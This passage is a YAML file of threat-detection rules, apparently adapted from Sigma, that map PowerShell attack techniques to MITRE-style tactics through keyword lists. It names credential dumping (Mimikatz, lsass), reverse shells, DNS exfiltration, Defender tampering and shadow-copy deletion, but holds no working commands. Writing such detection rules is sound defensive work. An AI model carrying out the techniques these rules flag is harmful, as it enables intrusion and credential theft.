  intent: defense_evasion
  tactic: defense_evasion
  description: Detects usage of the "Add-AppxPackage" or it's alias "Add-AppPackage"
    to install unsigned AppX packages
  conditions:
    summary:
      regex_any:
      - unsigned
      - appx
      - installation
      - attempt
      - using
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7b836d7f_179c_4ba4_90a7_a7e60afb48e6
  intent: lateral_movement
  tactic: lateral_movement
  description: Adversaries may use Valid Accounts to interact with remote systems
    using Windows Remote Management (WinRM). The adversary may then perform actions
    as the logged-on user.
  conditions:
    summary:
      regex_any:
      - execute
      - invoke
      - command
      - remote
      - host
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d59d7842_9a21_4bc6_ba98_64bfe0091355
  intent: data_exfiltration
  tactic: exfiltration
  description: DNSExfiltrator allows for transferring (exfiltrate) a file over a DNS
    request covert channel
  conditions:
    summary:
      regex_any:
      - powershell
      - dnsexfiltration
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_73e67340_0d25_11eb_adc1_0242ac120002
  intent: execution
  tactic: execution
  description: Detects Obfuscated use of Clip.exe to execute PowerShell
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - clip
      - launcher
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1b9dc62e_6e9e_42a3_8990_94d7a10007f7
  intent: execution
  tactic: execution
  description: Detects all variations of obfuscated powershell IEX invocation code
    generated by Invoke-Obfuscation framework from the following code block \u2014
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - obfuscated
      - invocation
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_779c8c12_0eb1_11eb_adc1_0242ac120002
  intent: execution
  tactic: execution
  description: Detects Obfuscated use of stdin to execute PowerShell
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - stdin
      - launcher
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0adfbc14_0ed1_11eb_adc1_0242ac120002
  intent: execution
  tactic: execution
  description: Detects Obfuscated use of Environment Variables to execute PowerShell
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - launcher
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_20e5497e_331c_4cd5_8d36_935f6e2a9a07
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via COMPRESS OBFUSCATION
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - compress
      - obfuscation
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e6cb92b4_b470_4eb8_8a9d_d63e8583aae0
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via RUNDLL LAUNCHER
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - rundll
      - launcher
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_86b896ba_ffa1_4fea_83e3_ee28a4c915c7
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via Stdin in Scripts
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - stdin
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_db92dd33_a3ad_49cf_8c2c_608c3e30ace0
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via use Clip.exe in Scripts
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - clip
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e55a5195_4724_480e_a77e_3ebe64bd3759
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via use MSHTA in Scripts
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - mshta
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a5a30a6e_75ca_4233_8b8c_42e0f2037d3b
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via use Rundll32 in Scripts
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - rundll32
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e54f5149_6ba3_49cf_b153_070d24679126
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via VAR++ LAUNCHER
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - launcher
      - obfuscation
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_34f90d3c_c297_49e9_b26d_911b05a4866c
  intent: data_staging
  tactic: collection
  description: Adversaries may log user keystrokes to intercept credentials as the
    user types them.
  conditions:
    summary:
      regex_any:
      - powershell
      - keylogging
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4fdc44df_bfe9_4fcc_b041_68f5a2d3031c
  intent: persistence_installation
  tactic: persistence
  description: 'Adversaries may manipulate accounts to maintain access to victim systems.

    Account manipulation may consist of any action that preserves adversary access
    to a compromised account, such as modifying credentials or permission groups

    '
  conditions:
    summary:
      regex_any:
      - powershell
      - localaccount
      - manipulation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4a241dea_235b_4a7e_8d76_50d817b146c4
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects usage of the powerShell New-MailboxExportRequest Cmdlet to
    exports a mailbox to a remote or local share, as used in ProxyShell exploitations
  conditions:
    summary:
      regex_any:
      - suspicious
      - powershell
      - mailbox
      - export
      - share
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_89819aa4_bbd6_46bc_88ec_c7f7fe30efa6
  intent: reconnaissance
  tactic: discovery
  description: Detects Commandlet names from well-known PowerShell exploitation frameworks
  conditions:
    summary:
      regex_any:
      - malicious
      - powershell
      - commandlets
      - scriptblock
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f62176f3_8128_4faa_bf6c_83261322e5eb
  intent: execution
  tactic: execution
  description: Detects keywords from well-known PowerShell exploitation frameworks
  conditions:
    summary:
      regex_any:
      - malicious
      - powershell
      - keywords
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cd185561_4760_45d6_a63e_a51325112cae
  intent: credential_harvesting
  tactic: credential_access
  description: Detects usage of a PowerShell command to dump the live memory of a
    Windows machine
  conditions:
    summary:
      regex_any:
      - live
      - memory
      - dump
      - using
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b7216a7d_687e_4c8d_82b1_3080b2ad961f
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detect malicious GPO modifications can be used to implement many other
    malicious behaviors.
  conditions:
    summary:
      regex_any:
      - modify
      - group
      - policy
      - settings
      - scriptblocklogging
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_78aa1347_1517_4454_9982_b338d6df8343
  intent: execution
  tactic: execution
  description: 'Adversaries may abuse PowerShell commands and scripts for execution.

    PowerShell is a powerful interactive command-line interface and scripting environment
    included in the Windows operating system. (Citation: TechNet PowerShell)

    Adversaries can use PowerShell to perform a number of actions, including discovery
    of information and execution of code

    '
  conditions:
    summary:
      regex_any:
      - powershell
      - msxml
      - object
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f772cee9_b7c2_4cb2_8f07_49870adc02e0
  intent: execution
  tactic: execution
  description: Detects Commandlet names and arguments from the Nishang exploitation
    framework
  conditions:
    summary:
      regex_any:
      - malicious
      - nishang
      - powershell
      - commandlets
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8c521530_5169_495d_a199_0a3a881ad24e
  intent: execution
  tactic: execution
  description: Detects writing data into NTFS alternate data streams from powershell.
    Needs Script Block Logging.
  conditions:
    summary:
      regex_any:
      - ntfs
      - alternate
      - data
      - stream
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_36fbec91_fa1b_4d5d_8df1_8d8edcb632ad
  intent: persistence_installation
  tactic: persistence
  description: 'Adversaries may abuse Microsoft Office add-ins to obtain persistence
    on a compromised system.

    Office add-ins can be used to add functionality to Office programs

    '
  conditions:
    summary:
      regex_any:
      - code
      - executed
      - office
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_da34e323_1e65_42db_83be_a6725ac2caa3
  intent: reconnaissance
  tactic: discovery
  description: 'Detects the execution of powershell scripts with calls to the "Start-NetEventSession"
    cmdlet. Which allows an attacker to start event and packet capture for a network
    event session.

    Adversaries may attempt to capture network to gather information over the course
    of an operation.

    Data captured via this technique may include user credentials, especially those
    sent over an insecure, unencrypted protocol.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - packet
      - capture
      - activity
      - start
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_189e3b02_82b2_4b90_9662_411eb64486d4
  intent: credential_harvesting
  tactic: credential_access
  description: Detects Invoke-Mimikatz PowerShell script and alike. Mimikatz is a
    credential dumper capable of obtaining plaintext Windows account logins and passwords.
  conditions:
    summary:
      regex_any:
      - potential
      - invoke
      - mimikatz
      - powershell
      - script
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cdfa73b6_3c9d_4bb8_97f8_ddbd8921f5c5
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the use of the "Get-ADComputer" cmdlet in order to identify
    systems which are configured for unconstrained delegation.
  conditions:
    summary:
      regex_any:
      - potential
      - unconstrained
      - delegation
      - discovery
      - adcomputer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5f9c7f1a_7c21_4c39_b2f3_8d8006e0e51f
  intent: execution
  tactic: execution
  description: Detects the installation and configuration of PowerShell Web Access,
    which could be used for remote access and potential abuse
  conditions:
    summary:
      regex_any:
      - powershell
      - access
      - installation
      - psscript
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dcd74b95_3f36_4ed9_9598_0490951643aa
  intent: execution
  tactic: execution
  description: Detects Cmdlet names from PowerView of the PowerSploit exploitation
    framework.
  conditions:
    summary:
      regex_any:
      - powerview
      - powershell
      - cmdlets
      - scriptblock
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ca8b77a9_d499_4095_b793_5d5f330d450e
  intent: execution
  tactic: execution
  description: Detects PowerShell calling a credential prompt
  conditions:
    summary:
      regex_any:
      - powershell
      - credential
      - prompt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_afd3df04_948d_46f6_ae44_25966c44b97f
  intent: execution
  tactic: execution
  description: Detects the use of PSAsyncShell an Asynchronous TCP Reverse Shell written
    in powershell
  conditions:
    summary:
      regex_any:
      - psasyncshell
      - asynchronous
      - reverse
      - shell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b7ec41a4_042c_4f31_a5db_d0fcde9fa5c5
  intent: execution
  tactic: execution
  description: Detects the use of PSAttack PowerShell hack tool
  conditions:
    summary:
      regex_any:
      - powershell
      - psattack
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cacef8fc_9d3d_41f7_956d_455c6e881bc5
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects PowerShell module creation where the module Contents are set
    to "function Get-VMRemoteFXPhysicalVideoAdapter". This could be a sign of potential
    abuse of the "RemoteFXvGPUDisablement.exe" binary which is known to be vulnerable
    to module load-order hijacking.
  conditions:
    summary:
      regex_any:
      - potential
      - remotefxvgpudisablement
      - abuse
      - powershell
      - scriptblock
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a0edd39f_a0c6_4c17_8141_261f958e8d8f
  intent: execution
  tactic: execution
  description: 'Adversaries may abuse PowerShell commands and scripts for execution.

    PowerShell is a powerful interactive command-line interface and scripting environment
    included in the Windows operating system

    '
  conditions:
    summary:
      regex_any:
      - powershell
      - remote
      - session
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a861d835_af37_4930_bcd6_5b178bfb54df
  intent: credential_harvesting
  tactic: credential_access
  description: 'utilize native PowerShell Identity modules to query the domain to
    extract the Service Principal Names for a single computer.

    This behavior is typically used during a kerberos or silver ticket attack.

    A successful execution will output the SPNs for the endpoint in question.

    '
  conditions:
    summary:
      regex_any:
      - request
      - single
      - ticket
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fbc5e92f_3044_4e73_a5c6_1c4359b539de
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects PowerShell scripts that have capabilities to read files, loop
    through them and resolve DNS host entries.
  conditions:
    summary:
      regex_any:
      - powershell
      - script
      - with
      - file
      - hostname
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_42821614_9264_4761_acfc_5772c3286f76
  intent: defense_evasion
  tactic: defense_evasion
  description: Adversaries may install a root certificate on a compromised system
    to avoid warnings when connecting to adversary controlled web servers.
  conditions:
    summary:
      regex_any:
      - root
      - certificate
      - installed
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_902cedee_0398_4e3a_8183_6f3a89773a96
  intent: defense_evasion
  tactic: defense_evasion
  description: Adversaries may abuse container files such as disk image (.iso, .vhd)
    file formats to deliver malicious payloads that may not be tagged with MOTW.
  conditions:
    summary:
      regex_any:
      - suspicious
      - invoke
      - item
      - from
      - mount
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7d416556_6502_45b2_9bad_9d2f05f38997
  intent: reconnaissance
  tactic: discovery
  description: Detect adversaries enumerate sensitive files
  conditions:
    summary:
      regex_any:
      - powershell
      - sensitive
      - file
      - discovery
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3bf1d859_3a7e_44cb_8809_a99e066d3478
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects PowerShell scripts to set the ACL to a file in the Windows
    folder
  conditions:
    summary:
      regex_any:
      - powershell
      - windows
      - folder
      - psscript
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_61d0475c_173f_4844_86f7_f3eebae1c66b
  intent: execution
  tactic: execution
  description: Detects changing the PowerShell script execution policy to a potentially
    insecure level using the "Set-ExecutionPolicy" cmdlet.
  conditions:
    summary:
      regex_any:
      - change
      - powershell
      - policies
      - insecure
      - level
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_16b37b70_6fcf_4814_a092_c36bd3aafcbd
  intent: execution
  tactic: execution
  description: Detects Base64 encoded Shellcode
  conditions:
    summary:
      regex_any:
      - powershell
      - shellcode
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_402e1e1d_ad59_47b6_bf80_1ee44985b3a7
  intent: execution
  tactic: execution
  description: Detects Commandlet names from ShellIntel exploitation scripts.
  conditions:
    summary:
      regex_any:
      - malicious
      - shellintel
      - powershell
      - commandlets
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2650dd1a_eb2a_412d_ac36_83f06c4f2282
  intent: reconnaissance
  tactic: discovery
  description: Adversaries may attempt to enumerate software for a variety of reasons,
    such as figuring out what security measures are present or if the compromised
    system has a version of software that is vulnerable.
  conditions:
    summary:
      regex_any:
      - detected
      - windows
      - software
      - discovery
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a699b30e_d010_46c8_bbd1_ee2e26765fe9
  intent: defense_evasion
  tactic: defense_evasion
  description: Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.
  conditions:
    summary:
      regex_any:
      - powershell
      - store
      - file
      - alternate
      - data
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2f77047c_e6e9_4c11_b088_a3de399524cd
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects usage of certain functions and keywords that are used to manipulate
    security descriptors in order to potentially set a backdoor. As seen used in the
    DAMP project.
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - security
      - descriptors
      - scriptblock
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0f017df3_8f5a_414f_ad6b_24aff1128278
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects usage of known powershell cmdlets such as "Clear-EventLog"
    to clear the Windows event logs
  conditions:
    summary:
      regex_any:
      - suspicious
      - eventlog
      - clear
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_162e69a7_7981_4344_84a9_0f1c9a217a52
  intent: reconnaissance
  tactic: discovery
  description: Detects technique used by MAZE ransomware to enumerate directories
    using Powershell
  conditions:
    summary:
      regex_any:
      - powershell
      - directory
      - enumeration
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_403c2cc0_7f6b_4925_9423_bfa573bed7eb
  intent: execution
  tactic: execution
  description: Detects suspicious PowerShell download command
  conditions:
    summary:
      regex_any:
      - suspicious
      - powershell
      - download
      - powershell
      - script
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b5522a23_82da_44e5_9c8b_e10ed8955f88
  intent: execution
  tactic: execution
  description: 'Adversaries may abuse the Windows command shell for execution.

    The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is
    the primary command prompt on Windows systems.

    The Windows command prompt can be used to control almost any aspect of a system,
    with various permission levels required for different subsets of commands.

    Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential
    commands to run, as well as normal scripting operations such as conditionals and
    loops.

    Common uses of batch files include long or repetitive tasks, or the need to run
    the same set of commands on multiple system

    '
  conditions:
    summary:
      regex_any:
      - powershell
      - execute
      - batch
      - script
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bd5971a7_626d_46ab_8176_ed643f694f68
  intent: credential_harvesting
  tactic: credential_access
  description: 'Adversaries may search local file systems and remote file shares for
    files containing insecurely stored credentials.

    These can be files created by users to store their own credentials, shared credential
    stores for a group of individuals,

    configuration files containing passwords for a system or service, or source code/binary
    files containing embedded passwords.

    '
  conditions:
    summary:
      regex_any:
      - extracting
      - information
      - with
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_03409c93_a7c7_49ba_9a4c_a00badf2a153
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "TroubleshootingPack" cmdlets to leverage CVE-2022-30190
    or action similar to "msdt" lolbin (as described in LOLBAS)
  conditions:
    summary:
      regex_any:
      - troubleshooting
      - pack
      - cmdlet
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_84c174ab_d3ef_481f_9c86_a50d0b8e3edb
  intent: credential_harvesting
  tactic: credential_access
  description: Detects a Get-Process command on lsass process, which is in almost
    all cases a sign of malicious activity
  conditions:
    summary:
      regex_any:
      - powershell
      - process
      - lsass
      - scriptblock
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8bc063d5_3a3a_4f01_a140_bc15e55e8437
  intent: persistence_installation
  tactic: persistence
  description: Detects suspicious Powershell code that execute COM Objects
  conditions:
    summary:
      regex_any:
      - suspicious
      - gettypefromclsid
      - shellexecute
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_42d36aa1_3240_4db0_8257_e0118dcdd9cd
  intent: defense_evasion
  tactic: defense_evasion
  description: Adversaries may carry out malicious operations using a virtual instance
    to avoid detection
  conditions:
    summary:
      regex_any:
      - suspicious
      - hyper
      - cmdlets
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ed965133_513f_41d9_a441_e38076a0798f
  intent: execution
  tactic: execution
  description: Detects suspicious PowerShell invocation command parameters
  conditions:
    summary:
      regex_any:
      - suspicious
      - powershell
      - invocations
      - generic
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ae7fbf8e_f3cb_49fd_8db4_5f3bed522c71
  intent: execution
  tactic: execution
  description: Detects suspicious PowerShell invocation command parameters
  conditions:
    summary:
      regex_any:
      - suspicious
      - powershell
      - invocations
      - specific
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d4488827_73af_4f8d_9244_7b7662ef046e
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Adversaries may communicate using application layer protocols associated
    with web traffic to avoid detection/network filtering by blending in with existing
    traffic.

    Commands to the remote system, and often the results of those commands, will be
    embedded within the protocol traffic between the client and server.

    '
  conditions:
    summary:
      regex_any:
      - change
      - user
      - agents
      - with
      - webrequest
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_70ad982f_67c8_40e0_a955_b920c2fa05cb
  intent: defense_evasion
  tactic: defense_evasion
  description: Open a handle on the drive volume via the \\.\ DOS device path specifier
    and perform direct access read of the first few bytes of the volume.
  conditions:
    summary:
      regex_any:
      - suspicious
      - filestream
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_965e2db9_eddb_4cf6_a986_7a967df651e4
  intent: credential_harvesting
  tactic: credential_access
  description: Detects PowerShell scripts that contains reference to keystroke capturing
    functions
  conditions:
    summary:
      regex_any:
      - potential
      - keylogger
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1f49f2ab_26bc_48b3_96cc_dcffbc93eadf
  intent: execution
  tactic: execution
  description: Detects potentially suspicious keywords that could indicate the use
    of a PowerShell exploitation framework
  conditions:
    summary:
      regex_any:
      - potential
      - suspicious
      - powershell
      - keywords
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2837e152_93c8_43d2_85ba_c3cd3c2ae614
  intent: data_staging
  tactic: collection
  description: 'Adversaries may target user email on local systems to collect sensitive
    information.

    Files containing email data can be acquired from a users local system, such as
    Outlook storage or cache files.

    '
  conditions:
    summary:
      regex_any:
      - powershell
      - local
      - email
      - collection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_66a4d409_451b_4151_94f4_a55d559c49b0
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when when a mounted share is removed. Adversaries may remove
    share connections that are no longer useful in order to clean up traces of their
    operation
  conditions:
    summary:
      regex_any:
      - powershell
      - deleted
      - mounted
      - share
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1c563233_030e_4a07_af8c_ee0490a66d3a
  intent: lateral_movement
  tactic: lateral_movement
  description: Adversaries may use to interact with a remote network share using Server
    Message Block (SMB). The adversary may then perform actions as the logged-on user.
  conditions:
    summary:
      regex_any:
      - suspicious
      - psdrive
      - admin
      - share
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bd33d2aa_497e_4651_9893_5c5364646595
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects powershell scripts that creates sockets/listeners which could
    be indicative of tunneling activity
  conditions:
    summary:
      regex_any:
      - suspicious
      - tunnel
      - powershell
      - script
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a9723fcc_881c_424c_8709_fd61442ab3c3
  intent: data_staging
  tactic: collection
  description: Once established within a system or network, an adversary may use automated
    techniques for collecting internal data
  conditions:
    summary:
      regex_any:
      - recon
      - information
      - export
      - with
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_48a45d45_8112_416b_8a67_46e03a4b2107
  intent: impact_operations
  tactic: impact
  description: 'Adversaries may interrupt availability of system and network resources
    by inhibiting access to accounts utilized by legitimate users.

    Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove
    access to accounts.

    '
  conditions:
    summary:
      regex_any:
      - remove
      - account
      - from
      - domain
      - admin
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_22d80745_6f2c_46da_826b_77adaededd74
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects usage of the "Set-Service" powershell cmdlet to configure a
    new SecurityDescriptor that allows a service to be hidden from other utilities
    such as "sc.exe", "Get-Service"...etc. (Works only in powershell 7)
  conditions:
    summary:
      regex_any:
      - suspicious
      - service
      - dacl
      - modification
      - service
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0718cd72_f316_4aa2_988f_838ea8533277
  intent: defense_evasion
  tactic: defense_evasion
  description: Powershell use PassThru option to start in background
  conditions:
    summary:
      regex_any:
      - suspicious
      - start
      - process
      - passthru
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5947497f_1aa4_41dd_9693_c9848d58727d
  intent: defense_evasion
  tactic: defense_evasion
  description: Remove the Zone.Identifier alternate data stream which identifies the
    file as downloaded from the internet.
  conditions:
    summary:
      regex_any:
      - suspicious
      - unblock
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c1337eb8_921a_4b59_855b_4ba188ddcc42
  intent: impact_operations
  tactic: impact
  description: Detects deletion of Windows Volume Shadow Copies with PowerShell code
    and Get-WMIObject. This technique is used by numerous ransomware families such
    as Sodinokibi/REvil
  conditions:
    summary:
      regex_any:
      - deletion
      - volume
      - shadow
      - copies
      - with
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_313fbb0a_a341_4682_848d_6d6f8c4fab7c
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Adversaries may use hidden windows to conceal malicious activity from
    the plain sight of users.

    In some cases, windows that would typically be displayed when an application carries
    out an operation can be hidden

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - powershell
      - windowstyle
      - option
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_35f41cd7_c98e_469f_8a02_ec4ba0cc7a7e
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects usage of the "Write-EventLog" cmdlet with 'RawData' flag. The
    cmdlet can be levreage to write malicious payloads to the EventLog and then retrieve
    them later for later use
  conditions:
    summary:
      regex_any:
      - powershell
      - write
      - eventlog
      - usage
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b7a3c9a3_09ea_4934_8864_6a32cacd98d9
  intent: data_staging
  tactic: collection
  description: 'Detects PowerShell scripts that make use of the "Compress-Archive"
    Cmdlet in order to compress folders and files where the output is stored in a
    potentially suspicious location that is used often by malware for exfiltration.

    An adversary might compress data (e.g., sensitive documents) that is collected
    prior to exfiltration in order to make it portable and minimize the amount of
    data sent over the network.

    '
  conditions:
    summary:
      regex_any:
      - folder
      - with
      - powershell
      - staging
      - temp
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dddfebae_c46f_439c_af7a_fdb6bde90218
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects SyncAppvPublishingServer process execution which usually utilized
    by adversaries to bypass PowerShell execution restrictions.
  conditions:
    summary:
      regex_any:
      - syncappvpublishingserver
      - execution
      - bypass
      - powershell
      - restriction
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ae2bdd58_0681_48ac_be7f_58ab4e593458
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects attempts to remove Windows Defender configuration using the
    'MpPreference' cmdlet
  conditions:
    summary:
      regex_any:
      - tamper
      - windows
      - defender
      - remove
      - mppreference
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_14c71865_6cd3_44ae_adaa_1db923fae5f2
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects PowerShell scripts attempting to disable scheduled scanning
    and other parts of Windows Defender ATP or set default actions to allow.
  conditions:
    summary:
      regex_any:
      - tamper
      - windows
      - defender
      - scriptblocklogging
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_adf876b3_f1f8_4aa9_a4e4_a64106feec06
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Adversaries may communicate using a protocol and port paring that
    are typically not associated.

    For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation:
    Fortinet Agent Tesla April 2018) as opposed to the traditional port 443.

    '
  conditions:
    summary:
      regex_any:
      - testing
      - usage
      - uncommonly
      - used
      - port
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c6438007_e081_42ce_9483_b067fbef33c3
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Adversaries may modify file time attributes to hide new or changes
    to existing files.

    Timestomping is a technique that modifies the timestamps of a file (the modify,
    access, create, and change times), often to mimic files that are in the same folder.

    '
  conditions:
    summary:
      regex_any:
